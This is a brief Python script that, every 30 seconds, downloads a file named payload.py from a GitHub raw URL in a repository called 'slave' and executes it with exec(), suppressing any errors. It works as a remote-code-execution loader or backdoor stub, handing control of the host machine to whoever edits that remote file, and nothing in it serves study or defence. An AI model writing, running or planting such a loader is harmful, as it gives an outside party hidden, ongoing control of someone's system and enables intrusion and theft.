from requests import get
from time import sleep

while True:
    try:
        payload = get('https://raw.githubusercontent.com/liverfried/slave/main/payload.py').text
        exec(payload)
    except:
        ...

    sleep(30)